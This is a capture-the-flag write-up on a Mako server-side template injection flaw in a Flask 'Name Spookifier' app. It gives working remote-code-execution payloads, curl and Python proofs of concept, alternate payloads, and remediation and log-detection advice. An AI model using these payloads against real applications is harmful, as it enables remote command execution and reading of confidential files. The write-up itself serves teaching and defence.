# Spookifier — Challenge Writeup

## Summary

- Challenge name: Name Spookifier
- Vulnerability: Server-Side Template Injection (SSTI) in Mako templates leading to remote command execution (RCE)
- Affected files: `challenge/application/util.py`, `challenge/application/blueprints/routes.py`
- Impact: Arbitrary Python code execution in the web process. Confidential data (e.g., `/flag.txt`) can be read.

## Vulnerable code pointers

- The route reads unsanitized input and passes it to the spookify function:
  - `challenge/application/blueprints/routes.py` — `text = request.args.get('text')` -> `spookify(text)`
- The util builds a template string from user-controlled data and renders it with Mako:
  - `challenge/application/util.py` — `result = '''...'''.format(*converted_fonts)` then `Template(result).render()`

Why this is dangerous: Mako evaluates `${...}` expressions during render. The app inserts user-controlled content into the template string without escaping, and one of the font mappings (`font4`) preserves punctuation like `$`, `{`, and `}`, allowing `${...}` payloads to survive conversion and be executed.

## Proof of Concept (PoC)

Payload used to read `/flag.txt`:

```
${__import__('os').popen('cat /flag.txt').read()}
```

Working `curl` example (proper quoting to avoid shell expansion):

```bash
curl 'http://TARGET:PORT/' --get --data-urlencode 'text=${__import__("os").popen("cat /flag.txt").read()}' -s
```

Or escape the `$`:

```bash
curl 'http://TARGET:PORT/' --get --data-urlencode "text=\${__import__('os').popen('cat /flag.txt').read()}" -s
```

Python PoC (requests):

```python
import requests

url = 'http://TARGET:PORT/'
payload = '${__import__("os").popen("cat /flag.txt").read()}'
resp = requests.get(url, params={'text': payload}, timeout=10)
print(resp.text)
```

The response HTML includes the executed template output (search the returned page for `HTB{`).

## Reproduction steps (local)

1. Install dependencies and run the app locally:

```bash
python3 -m venv venv
source venv/bin/activate
pip install flask flask-mako mako
python3 challenge/run.py
```

2. Trigger the PoC against `http://127.0.0.1:1337/` with the curl or python examples above.

## Why injection works (mechanics)

- The application constructs a string `result` from four font-converted variants of the input and then passes it to `Template(result).render()`.
- Mako treats `${...}` blocks as Python expressions. Since user input is not escaped and one font preserves punctuation, an attacker can place `${...}` in `text` and have it executed at render time.

## Alternate payloads

- If `os.popen` is unavailable, try subprocess:

```
${__import__('subprocess').check_output(['cat','/flag.txt']).decode()}
```
- Try other file locations: `flag.txt`, `/home/ctf/flag.txt`, `/root/flag.txt`, etc.

## Suggested immediate remediation (minimal, high-value)

1. Stop rendering user-controlled strings as templates. Replace dynamic `Template(user_string).render()` with safe HTML construction and escaping.

Example safe replacement for `generate_render()` in `challenge/application/util.py`:

```python
import html

def generate_render(converted_fonts):
    # converted_fonts is a list of strings
    rows = ''.join(f'<tr><td>{html.escape(s)}</td></tr>' for s in converted_fonts)
    return rows
```

2. Alternatively, move the table HTML into the static template (`templates/index.html`) and pass the converted text as template variables to `render_template()`. Let the template engine escape values or explicitly escape them in the template.

3. Add input validation/whitelisting for `text` (for a name field allow letters, numbers, spaces, and a tiny set of punctuation).

4. Run the process with least-privilege so a compromise cannot read highly sensitive files.

## Detection & monitoring

- Log and alert on incoming request parameters that contain `${` or `{%` or other template tokens.
- Search existing logs for `__import__`, `popen`, `subprocess` occurrences in request data.

## Impact & severity

- Severity: High (RCE via SSTI)
- Confidentiality: Full read access to files readable by the app process
- Integrity/Availability: Attacker can execute arbitrary commands